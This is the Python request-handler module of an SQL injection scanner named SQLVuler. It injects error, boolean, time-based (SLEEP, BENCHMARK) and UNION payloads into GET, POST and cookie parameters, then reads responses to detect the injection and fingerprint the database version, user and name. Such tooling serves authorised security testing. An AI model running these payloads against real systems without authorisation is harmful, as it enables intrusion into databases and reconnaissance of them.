#!/usr/bin/env python3
"""
Request Handler for SQLVuler
Manages HTTP requests and analyzes responses for SQL injection testing
"""

import time
import re
import requests
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
import json
import hashlib
from colorama import Fore, Style

from sqlvuler.utils.logger import get_logger

class RequestHandler:
    """Handles HTTP requests and response analysis for SQL injection testing"""
    
    def __init__(self, config_manager=None, payload_manager=None):
        """
        Initialize the Request Handler
        
        Args:
            config_manager: Configuration manager instance
            payload_manager: Payload manager instance
        """
        self.logger = get_logger()
        self.config_manager = config_manager
        self.payload_manager = payload_manager
        
        # Default configuration
        self.timeout = 10
        self.max_retries = 3
        self.delay = 0
        self.follow_redirects = True
        self.verify_ssl = True
        self.user_agent = "SQLVuler/1.0 (Educational Purpose Only)"
        self.proxies = None
        self.time_delay_threshold = 5  # Seconds
        
        # Results tracking
        self.vulnerability_found = False
        self.successful_payloads = []
        self.database_type = "Unknown"
        self.database_version = None
        
        # Load configuration if provided
        if self.config_manager:
            self._load_config()
        
        # Create a session for connection pooling
        self.session = requests.Session()
        
        # Response cache to avoid duplicate requests
        self.response_cache = {}
    
    def _load_config(self):
        """Load configuration from the config manager"""
        try:
            # Load HTTP configuration
            if self.config_manager.get("http.timeout"):
                self.timeout = self.config_manager.get("http.timeout")
            
            if self.config_manager.get("http.retry"):
                self.max_retries = self.config_manager.get("http.retry")
            
            if self.config_manager.get("http.delay"):
                self.delay = self.config_manager.get("http.delay")
            
            if self.config_manager.get("http.follow_redirects") is not None:
                self.follow_redirects = self.config_manager.get("http.follow_redirects")
            
            if self.config_manager.get("http.verify_ssl") is not None:
                self.verify_ssl = self.config_manager.get("http.verify_ssl")
            
            if self.config_manager.get("http.user_agent"):
                self.user_agent = self.config_manager.get("http.user_agent")
            
            if self.config_manager.get("http.proxy"):
                proxy = self.config_manager.get("http.proxy")
                self.proxies = {
                    "http": proxy,
                    "https": proxy
                }
            
            # Load scanner configuration
            if self.config_manager.get("scanner.time_threshold"):
                self.time_delay_threshold = self.config_manager.get("scanner.time_threshold")
            
            self.logger.debug("Loaded request handler configuration")
        except Exception as e:
            self.logger.error(f"Error loading request handler configuration: {str(e)}")
    
    def build_request(self, parameter, payload):
        """
        Build a request with the given parameter and payload
        
        Args:
            parameter (dict): Parameter information
            payload (str): Payload to inject
            
        Returns:
            dict: Request data for sending
        """
        # Clone the parameter to avoid modifying the original
        param = parameter.copy()
        
        # Base URL without query parameters
        url = param.get("url", "")
        if "?" in url:
            url = url.split("?")[0]
        
        # Default headers
        headers = {
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive"
        }
        
        # Add any custom headers
        if "headers" in param and param["headers"]:
            headers.update(param["headers"])
        
        # Format the payload if needed
        formatted_payload = payload
        
        # Request data
        request_data = {
            "method": param.get("type", "GET"),
            "url": url,
            "params": {},
            "data": {},
            "headers": headers,
            "cookies": {},
            "original_param_value": param.get("value", ""),
            "payload": formatted_payload,
            "parameter": param.get("name", ""),
            "parameter_type": param.get("type", "GET")
        }
        
        # Handle different parameter types
        if param.get("in_url", False):
            # For URL parameters (GET)
            request_data["method"] = "GET"
            
            # Add all GET parameters
            query_params = {}
            if "?" in param.get("url", ""):
                query_part = param.get("url", "").split("?", 1)[1]
                query_params = dict(parse_qsl(query_part))
            
            # Replace the target parameter with the payload
            query_params[param["name"]] = formatted_payload
            
            # Set the query parameters
            request_data["params"] = query_params
        
        elif param.get("in_body", False):
            # For body parameters (POST)
            request_data["method"] = "POST"
            
            # Build POST data
            post_data = {}
            
            # If we have data in the parameter, use it
            if "data" in param and param["data"]:
                post_data.update(param["data"])
            
            # Replace the target parameter with the payload
            post_data[param["name"]] = formatted_payload
            
            # Set the post data
            request_data["data"] = post_data
            
            # Add content type header if not present
            if "Content-Type" not in headers:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                request_data["headers"] = headers
        
        elif param.get("in_cookie", False):
            # For cookie parameters
            cookies = {}
            
            # Add cookies from parameter if present
            if "cookies" in param and param["cookies"]:
                cookies.update(param["cookies"])
            
            # Replace the target cookie with the payload
            cookies[param["name"]] = formatted_payload
            
            # Set the cookies
            request_data["cookies"] = cookies
        
        return request_data
    
    def send_request(self, request_data):
        """
        Send an HTTP request and return the response
        
        Args:
            request_data (dict): Request data from build_request
            
        Returns:
            dict: Response information
        """
        method = request_data["method"]
        url = request_data["url"]
        params = request_data["params"]
        data = request_data["data"]
        headers = request_data["headers"]
        cookies = request_data["cookies"]
        
        # Create cache key for this request
        cache_key = self._create_cache_key(method, url, params, data, headers, cookies)
        
        # Check if we have a cached response
        if cache_key in self.response_cache:
            self.logger.debug(f"Using cached response for {url}")
            return self.response_cache[cache_key]
        
        # Log request information
        self.logger.debug(f"Sending {method} request to {url}")
        if request_data["parameter"]:
            self.logger.debug(f"Testing parameter '{request_data['parameter']}' with payload: {request_data['payload']}")
        
        # Try to send the request with retries
        for attempt in range(self.max_retries):
            try:
                start_time = time.time()
                
                if method == "GET":
                    response = self.session.get(
                        url,
                        params=params,
                        headers=headers,
                        cookies=cookies,
                        allow_redirects=self.follow_redirects,
                        timeout=self.timeout,
                        verify=self.verify_ssl,
                        proxies=self.proxies
                    )
                elif method == "POST":
                    response = self.session.post(
                        url,
                        params=params,
                        data=data,
                        headers=headers,
                        cookies=cookies,
                        allow_redirects=self.follow_redirects,
                        timeout=self.timeout,
                        verify=self.verify_ssl,
                        proxies=self.proxies
                    )
                else:
                    self.logger.error(f"Unsupported HTTP method: {method}")
                    return None
                
                # Calculate elapsed time
                elapsed_time = time.time() - start_time
                
                # Create response info
                response_info = {
                    "status_code": response.status_code,
                    "content": response.text,
                    "headers": dict(response.headers),
                    "cookies": dict(response.cookies),
                    "elapsed_time": elapsed_time,
                    "final_url": response.url,
                    "content_length": len(response.content),
                    "request_data": request_data
                }
                
                # Cache the response
                self.response_cache[cache_key] = response_info
                
                # Log response information
                self.logger.debug(f"Received response: status={response.status_code}, time={elapsed_time:.2f}s, size={len(response.content)} bytes")
                
                # Add delay between requests if configured
                if self.delay > 0:
                    time.sleep(self.delay)
                
                return response_info
                
            except (requests.exceptions.Timeout, requests.exceptions.ConnectTimeout):
                self.logger.debug(f"Request timeout (attempt {attempt + 1}/{self.max_retries})")
                
                # If this is a time-based test, a timeout might indicate a successful injection
                if "time" in request_data.get("technique", "").lower():
                    self.logger.debug("Timeout in time-based test, might indicate a successful injection")
                    
                    # Create a timeout response
                    timeout_response = {
                        "status_code": 0,
                        "content": "",
                        "headers": {},
                        "cookies": {},
                        "elapsed_time": self.timeout,
                        "final_url": url,
                        "content_length": 0,
                        "request_data": request_data,
                        "timed_out": True
                    }
                    
                    return timeout_response
                
                if attempt == self.max_retries - 1:
                    self.logger.error(f"Request failed after {self.max_retries} attempts: Timeout")
                    return None
            
            except requests.exceptions.ConnectionError:
                self.logger.debug(f"Connection error (attempt {attempt + 1}/{self.max_retries})")
                if attempt == self.max_retries - 1:
                    self.logger.error(f"Request failed after {self.max_retries} attempts: Connection Error")
                    return None
            
            except Exception as e:
                self.logger.debug(f"Request exception: {str(e)} (attempt {attempt + 1}/{self.max_retries})")
                if attempt == self.max_retries - 1:
                    self.logger.error(f"Request failed after {self.max_retries} attempts: {str(e)}")
                    return None
            
            # Add increasing delay between retries
            retry_delay = self.delay + attempt * 0.5
            if retry_delay > 0:
                time.sleep(retry_delay)
        
        return None
    
    def _create_cache_key(self, method, url, params, data, headers, cookies):
        """
        Create a cache key for a request
        
        Args:
            method (str): HTTP method
            url (str): URL
            params (dict): URL parameters
            data (dict): POST data
            headers (dict): HTTP headers
            cookies (dict): Cookies
            
        Returns:
            str: Cache key
        """
        # Convert all elements to strings and sort for consistency
        key_parts = [
            method,
            url,
            json.dumps(params, sort_keys=True) if params else "",
            json.dumps(data, sort_keys=True) if data else "",
            # Only include essential headers in the cache key
            json.dumps({k: v for k, v in headers.items() if k in ["Content-Type", "Accept"]}, sort_keys=True),
            json.dumps(cookies, sort_keys=True) if cookies else ""
        ]
        
        # Join all parts and create a hash
        key_string = "|".join(key_parts)
        return hashlib.md5(key_string.encode()).hexdigest()
    
    def analyze_response(self, response_info, baseline_response=None, technique="error"):
        """
        Analyze a response for signs of SQL injection vulnerability
        
        Args:
            response_info (dict): Response information from send_request
            baseline_response (dict): Baseline response for comparison
            technique (str): Detection technique (error, boolean, time, union)
            
        Returns:
            dict: Analysis results
        """
        if not response_info:
            return {"vulnerable": False, "reason": "No response received"}
        
        # Initialize result
        result = {
            "vulnerable": False,
            "technique": technique,
            "payload": response_info.get("request_data", {}).get("payload", ""),
            "parameter": response_info.get("request_data", {}).get("parameter", ""),
            "confidence": 0.0,
            "database_type": "Unknown",
            "database_version": None,
            "evidence": None
        }
        
        # Select analysis method based on technique
        if technique.lower() == "error":
            return self._analyze_error_based(response_info, result)
        elif technique.lower() == "boolean":
            return self._analyze_boolean_based(response_info, baseline_response, result)
        elif technique.lower() == "time":
            return self._analyze_time_based(response_info, result)
        elif technique.lower() == "union":
            return self._analyze_union_based(response_info, result)
        else:
            result["reason"] = f"Unknown technique: {technique}"
            return result
    
    def _analyze_error_based(self, response_info, result):
        """
        Analyze for error-based SQL injection
        
        Args:
            response_info (dict): Response information
            result (dict): Analysis result to update
            
        Returns:
            dict: Updated analysis result
        """
        # Check for SQL error messages in response
        content = response_info.get("content", "")
        
        # MySQL error patterns
        mysql_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB) server version",
            r"MySQL server version for the right syntax",
            r"Unknown column '[^']+' in 'where clause'",
            r"You have an error in your SQL syntax",
            r"MySqlException",
            r"MySqlClient\."
        ]
        
        # Check for MySQL errors
        for pattern in mysql_patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                result["vulnerable"] = True
                result["technique"] = "error"
                result["database_type"] = "MySQL"
                result["confidence"] = 0.9
                result["evidence"] = match.group(0)
                
                # Try to extract version information
                version_match = re.search(r"MySQL server version: '([^']+)'", content)
                if version_match:
                    result["database_version"] = version_match.group(1)
                
                return result
        
        # If no errors found
        result["reason"] = "No SQL error detected"
        return result
    
    def _analyze_boolean_based(self, response_info, baseline_response, result):
        """
        Analyze for boolean-based SQL injection
        
        Args:
            response_info (dict): Response information
            baseline_response (dict): Baseline response for comparison
            result (dict): Analysis result to update
            
        Returns:
            dict: Updated analysis result
        """
        if not baseline_response:
            result["reason"] = "No baseline response for comparison"
            return result
        
        # Compare response content and size
        content = response_info.get("content", "")
        baseline_content = baseline_response.get("content", "")
        
        content_length = response_info.get("content_length", 0)
        baseline_length = baseline_response.get("content_length", 0)
        
        # Calculate size difference
        size_diff = abs(content_length - baseline_length)
        size_ratio = size_diff / max(baseline_length, 1)
        
        # Check for significant size difference
        if size_ratio > 0.4:  # More than 40% different
            result["vulnerable"] = True
            result["technique"] = "boolean"
            result["database_type"] = "MySQL"  # Assuming MySQL for now
            result["confidence"] = 0.7
            result["evidence"] = f"Content size difference: {size_diff} bytes ({size_ratio * 100:.1f}%)"
            return result
        
        # Check for content pattern differences
        true_patterns = [
            r"<title>.*Admin.*</title>",
            r"<h1>.*Welcome.*</h1>",
            r"Login successful",
            r"User information"
        ]
        
        for pattern in true_patterns:
            baseline_match = re.search(pattern, baseline_content, re.IGNORECASE)
            response_match = re.search(pattern, content, re.IGNORECASE)
            
            if (baseline_match and not response_match) or (not baseline_match and response_match):
                result["vulnerable"] = True
                result["technique"] = "boolean"
                result["database_type"] = "MySQL"  # Assuming MySQL for now
                result["confidence"] = 0.8
                result["evidence"] = f"Content pattern difference: {pattern}"
                return result
        
        # If no differences found
        result["reason"] = "No significant differences detected"
        return result
    
    def _analyze_time_based(self, response_info, result):
        """
        Analyze for time-based SQL injection
        
        Args:
            response_info (dict): Response information
            result (dict): Analysis result to update
            
        Returns:
            dict: Updated analysis result
        """
        # Check if request timed out
        if response_info.get("timed_out", False):
            result["vulnerable"] = True
            result["technique"] = "time"
            result["database_type"] = "MySQL"  # Assuming MySQL for now
            result["confidence"] = 0.9
            result["evidence"] = f"Request timed out (threshold: {self.timeout}s)"
            return result
        
        # Check for delay in response
        elapsed_time = response_info.get("elapsed_time", 0)
        
        if elapsed_time >= self.time_delay_threshold:
            result["vulnerable"] = True
            result["technique"] = "time"
            result["database_type"] = "MySQL"  # Assuming MySQL for now
            result["confidence"] = min(0.7 + (elapsed_time - self.time_delay_threshold) * 0.05, 0.95)  # Increase confidence with longer delays
            result["evidence"] = f"Response delay: {elapsed_time:.2f}s (threshold: {self.time_delay_threshold}s)"
            return result
        
        # If no delay detected
        result["reason"] = f"No significant delay detected (elapsed: {elapsed_time:.2f}s, threshold: {self.time_delay_threshold}s)"
        return result
    
    def _analyze_union_based(self, response_info, result):
        """
        Analyze for UNION-based SQL injection
        
        Args:
            response_info (dict): Response information
            result (dict): Analysis result to update
            
        Returns:
            dict: Updated analysis result
        """
        # Check for signs of successful UNION injection
        content = response_info.get("content", "")
        
        # Common markers in UNION payloads
        union_markers = [
            r"SQLVuler_UNION_TEST",
            r"MySQL_VERSION",
            r"CURRENT_USER\([^\)]*\)"
        ]
        
        for marker in union_markers:
            match = re.search(marker, content, re.IGNORECASE)
            if match:
                result["vulnerable"] = True
                result["technique"] = "union"
                result["database_type"] = "MySQL"  # Assuming MySQL for now
                result["confidence"] = 0.95
                result["evidence"] = f"UNION injection marker found: {match.group(0)}"
                
                # Check for version information
                version_match = re.search(r"MySQL ([0-9\.]+)", content)
                if version_match:
                    result["database_version"] = version_match.group(1)
                
                return result
        
        # Look for exposed database information
        db_info_patterns = [
            r"<[^>]*>([0-9]+\.[0-9]+\.[0-9]+[^<]*)</[^>]*>",  # Version numbers in HTML
            r"<[^>]*>(root@[^<]+)</[^>]*>"  # Database user in HTML
        ]
        
        for pattern in db_info_patterns:
            match = re.search(pattern, content)
            if match:
                result["vulnerable"] = True
                result["technique"] = "union"
                result["database_type"] = "MySQL"  # Assuming MySQL for now
                result["confidence"] = 0.8
                result["evidence"] = f"Database information leaked: {match.group(1)}"
                return result
        
        # If no signs found
        result["reason"] = "No signs of successful UNION injection"
        return result
    
    def test_parameter(self, parameter, technique="error"):
        """
        Test a parameter for SQL injection vulnerability using a specific technique
        
        Args:
            parameter (dict): Parameter information
            technique (str): Detection technique (error, boolean, time, union)
            
        Returns:
            dict: Test results
        """
        # Skip disabled parameters
        if not parameter.get("enabled", True):
            return {"vulnerable": False, "reason": "Parameter is disabled"}
        
        self.logger.info(f"Testing parameter '{parameter['name']}' using {technique}-based technique")
        
        # Get baseline response (parameter with original value)
        baseline_request = self.build_request(parameter, parameter["value"])
        baseline_response = self.send_request(baseline_request)
        
        # Skip if we couldn't get a baseline response
        if not baseline_response:
            return {"vulnerable": False, "reason": "Failed to get baseline response"}
        
        # Get payloads for the selected technique
        payloads = []
        
        # Use payload manager if available
        if self.payload_manager:
            if technique == "error":
                payloads = self.payload_manager.get_payloads(category="detection", payload_type="error_based")
            elif technique == "boolean":
                payloads = self.payload_manager.get_payloads(category="detection", payload_type="boolean_based")
            elif technique == "time":
                payloads = self.payload_manager.get_payloads(category="detection", payload_type="time_based")
            elif technique == "union":
                payloads = self.payload_manager.get_payloads(category="detection", payload_type="union_based")
        
        # Fallback payloads if none found or no payload manager
        if not payloads:
            if technique == "error":
                payloads = [
                    {"payload": "'", "description": "Single quote"},
                    {"payload": "\"", "description": "Double quote"},
                    {"payload": "1'", "description": "Numeric single quote"},
                    {"payload": "1\"", "description": "Numeric double quote"},
                    {"payload": "1' OR '1'='1", "description": "OR condition"},
                    {"payload": "1\" OR \"1\"=\"1", "description": "Double quote OR condition"},
                    {"payload": "1' AND 1=1--", "description": "AND condition with comment"},
                ]
            elif technique == "boolean":
                payloads = [
                    {"payload": "1' AND 1=1--", "description": "True condition"},
                    {"payload": "1' AND 1=0--", "description": "False condition"},
                    {"payload": "1\" AND 1=1--", "description": "Double quote true condition"},
                    {"payload": "1\" AND 1=0--", "description": "Double quote false condition"},
                ]
            elif technique == "time":
                payloads = [
                    {"payload": "1' AND SLEEP(5)--", "description": "MySQL sleep"},
                    {"payload": "1\" AND SLEEP(5)--", "description": "Double quote MySQL sleep"},
                    {"payload": "1' AND BENCHMARK(1000000,MD5('test'))--", "description": "MySQL benchmark"},
                ]
            elif technique == "union":
                payloads = [
                    {"payload": "1' UNION SELECT 1,2,3--", "description": "Basic UNION"},
                    {"payload": "1' UNION SELECT 1,2,DATABASE()--", "description": "UNION with database name"},
                    {"payload": "1' UNION SELECT 1,2,VERSION()--", "description": "UNION with version"},
                ]
        
        # Test each payload
        results = []
        
        self.logger.info(f"Testing {len(payloads)} payloads for {technique}-based injection")
        
        for idx, payload_item in enumerate(payloads[:10]):  # Limit to first 10 payloads for efficiency
            payload = payload_item["payload"] if isinstance(payload_item, dict) else payload_item
            
            self.logger.debug(f"Testing payload ({idx + 1}/{min(len(payloads), 10)}): {payload}")
            
            # Build and send request with the payload
            request_data = self.build_request(parameter, payload)
            request_data["technique"] = technique  # Add technique to request data
            
            response_info = self.send_request(request_data)
            
            # Skip if request failed
            if not response_info:
                continue
            
            # Analyze the response
            analysis_result = self.analyze_response(response_info, baseline_response, technique)
            
            # Add payload information
            if isinstance(payload_item, dict):
                analysis_result["payload_description"] = payload_item.get("description", "")
            
            # Store result
            results.append(analysis_result)
            
            # Stop if vulnerable
            if analysis_result["vulnerable"]:
                self.vulnerability_found = True
                self.successful_payloads.append({
                    "parameter": parameter["name"],
                    "payload": payload,
                    "technique": technique,
                    "database_type": analysis_result.get("database_type", "Unknown"),
                    "database_version": analysis_result.get("database_version"),
                    "evidence": analysis_result.get("evidence")
                })
                
                # Update database type information if found
                if analysis_result.get("database_type") and analysis_result.get("database_type") != "Unknown":
                    self.database_type = analysis_result["database_type"]
                
                if analysis_result.get("database_version"):
                    self.database_version = analysis_result["database_version"]
                
                # Log the vulnerability
                self.logger.info(
                    f"{Fore.GREEN}SQL injection vulnerability found in parameter '{parameter['name']}' "
                    f"using {technique}-based technique{Style.RESET_ALL}"
                )
                self.logger.info(f"Payload: {payload}")
                self.logger.info(f"Evidence: {analysis_result.get('evidence')}")
                
                # Don't test all payloads if we found a vulnerability
                break
        
        # Combine results
        combined_result = {
            "parameter": parameter["name"],
            "technique": technique,
            "vulnerable": any(r["vulnerable"] for r in results),
            "results": results,
            "successful_payloads": [r for r in results if r["vulnerable"]],
            "database_type": self.database_type,
            "database_version": self.database_version
        }
        
        return combined_result
    
    def verify_vulnerability(self, parameter, payload):
        """
        Verify a suspected vulnerability with additional tests
        
        Args:
            parameter (dict): Parameter information
            payload (str): Payload that triggered the vulnerability
            
        Returns:
            dict: Verification results
        """
        self.logger.info(f"Verifying vulnerability in parameter '{parameter['name']}' with payload: {payload}")
        
        # Build and send request with the payload
        request_data = self.build_request(parameter, payload)
        response_info = self.send_request(request_data)
        
        # Skip if request failed
        if not response_info:
            return {"verified": False, "reason": "Failed to send verification request"}
        
        # Check for signs of SQL injection
        content = response_info.get("content", "")
        
        # Verification tests
        verification_tests = [
            # Version detection
            {
                "payload": "' UNION SELECT VERSION(),2--",
                "patterns": [r"([0-9]+\.[0-9]+\.[0-9]+)"],
                "type": "version"
            },
            # User detection
            {
                "payload": "' UNION SELECT CURRENT_USER(),2--",
                "patterns": [r"([a-zA-Z0-9_]+@[a-zA-Z0-9_]+)"],
                "type": "user"
            },
            # Database name detection
            {
                "payload": "' UNION SELECT DATABASE(),2--",
                "patterns": [r">([a-zA-Z0-9_]+)<"],
                "type": "database"
            }
        ]
        
        verification_results = []
        
        for test in verification_tests:
            # Build and send request with verification payload
            test_request = self.build_request(parameter, test["payload"])
            test_response = self.send_request(test_request)
            
            if not test_response:
                continue
            
            # Check for patterns
            test_content = test_response.get("content", "")
            
            for pattern in test["patterns"]:
                match = re.search(pattern, test_content)
                if match:
                    verification_results.append({
                        "type": test["type"],
                        "payload": test["payload"],
                        "value": match.group(1),
                        "verified": True
                    })
                    
                    # Update database information
                    if test["type"] == "version":
                        self.database_version = match.group(1)
                    elif test["type"] == "database":
                        self.current_database = match.group(1)
                    
                    break
        
        # Return combined results
        return {
            "parameter": parameter["name"],
            "payload": payload,
            "verified": len(verification_results) > 0,
            "verification_results": verification_results,
            "database_type": self.database_type,
            "database_version": self.database_version
        }
    
    def clear_cache(self):
        """Clear the response cache"""
        self.response_cache = {}
        self.logger.debug("Response cache cleared")
    
    def get_results(self):
        """
        Get the testing results
        
        Returns:
            dict: Testing results summary
        """
        return {
            "vulnerability_found": self.vulnerability_found,
            "successful_payloads": self.successful_payloads,
            "database_type": self.database_type,
            "database_version": self.database_version
        }
    
    def reset_results(self):
        """Reset testing results"""
        self.vulnerability_found = False
        self.successful_payloads = []
        self.database_type = "Unknown"
        self.database_version = None
    
    def test_all_techniques(self, parameter):
        """
        Test a parameter using all available techniques
        
        Args:
            parameter (dict): Parameter information
            
        Returns:
            dict: Test results from all techniques
        """
        techniques = ["error", "boolean", "time", "union"]
        results = {}
        
        for technique in techniques:
            results[technique] = self.test_parameter(parameter, technique)
            
            # Stop if we find a vulnerability
            if results[technique]["vulnerable"]:
                break
        
        # Combine results
        combined_result = {
            "parameter": parameter["name"],
            "vulnerable": any(results[t]["vulnerable"] for t in techniques),
            "results": results,
            "database_type": self.database_type,
            "database_version": self.database_version
        }
        
        return combined_result

